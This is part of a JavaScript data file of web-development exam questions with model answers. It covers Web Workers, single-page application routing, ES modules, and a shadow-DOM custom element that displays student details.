        { label: "a i", type: "text", q: `<p>The code <code>const myWorker = new Worker('./worker.js');</code> creates a new Web Worker. What is a Web Worker, and what can we use Web Workers for?</p>`, sol: "@worker" },
        { label: "a ii", type: "code", lang: "javascript", q: `<p>A Web Worker gets a list of numbers (e.g. an Array) from the main program and calculates the sum. When finished, the main program displays the result in the web console. Write the code for the main program and for the worker. The worker should ignore elements that are not numbers.</p>`, starter: "// main.js\n\n\n// worker.js\n",
          sol: `~~~javascript
// main.js
const myWorker = new Worker('./js/workers/worker.js');
myWorker.addEventListener('message', (event) => {
    console.log(event.data);
});
myWorker.postMessage([23, 67, -123, 56.78, "x", 12, 546]);

// worker.js
self.addEventListener('message', (e) => {
    const sum = e.data
        .filter(number => typeof number === "number" && !Number.isNaN(number))
        .reduce((sum, number) => sum + number, 0);
    self.postMessage(sum);
});
~~~` },
        { label: "a iii", type: "text", q: `<p>What is the maximum number of concurrent threads that can access the DOM? You must explain your answer.</p>`, sol: "@domThreads" },
        { label: "b i", type: "text", q: `<p>What is a single-page application (SPA), and what distinguishes it from a multi-page application?</p>`, sol: "@spa" },
        { label: "b ii", type: "text", q: `<p>Routing is one important feature of modern SPA frameworks. List some other important features.</p>`, sol: `<p>Reusable components, a template system, synchronization of state and view (and routing).</p>` },
        { label: "b iii–iv", type: "text", q: `<p>iii. What is meant by routing in the context of a SPA? Why do we need routing?<br>iv. What approaches can be used to implement routing in plain JavaScript?</p>`, sol: "@routing" },
        { label: "c i", type: "text", q: `<p>The JavaScript code is loaded with <code>&lt;script src="js/componentdemo.js" type="module"&gt;&lt;/script&gt;</code>. What are the consequences of the type="module" attribute?</p>`,
          sol: `<p>The code is treated as a JavaScript module; without it, code with import fails. type="module" also implies defer: the script is fetched in parallel with parsing, but executed after the document is parsed, so the DOM is built when the script runs.</p>` },
        { label: "c ii", type: "code", lang: "javascript", q: `<p>A custom tag is used like <code>&lt;student-info data-name="Ola Nordmann" data-phonnumber="12345678"&gt;&lt;/student-info&gt;</code>. The GUI component is the default export of a module and is imported by componentdemo.js, which binds it to the tag student-info. Write the code of componentdemo.js.</p>`,
          sol: `~~~javascript
import StudentInfo from './components/student-info/main.js';
customElements.define('student-info', StudentInfo);
~~~` },
        { label: "c iii", type: "code", lang: "javascript", q: `<p>The component uses shadow DOM and an HTML DL list to display the student name and phone number. Use this CSS: <code>DT { font-weight: bold; }</code>. Write the code for the GUI component module.</p>`,
          sol: `~~~javascript
export default class extends HTMLElement {
    #shadow;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });

        const style = document.createElement('style');
        style.textContent = "dt { font-weight: bold; }";
        this.#shadow.appendChild(style);

        const dl = document.createElement('dl');
        const items = [["Student name", this.getAttribute('data-name')],
                       ["Phone number", this.getAttribute('data-phonnumber')]];
        for (const [label, value] of items) {
            const dt = document.createElement('dt');
            dt.textContent = label;
            const dd = document.createElement('dd');
            dd.textContent = value ?? "";
            dl.append(dt, dd);
        }
        this.#shadow.appendChild(dl);
    }
}
~~~` }
      ]}
  ]
});
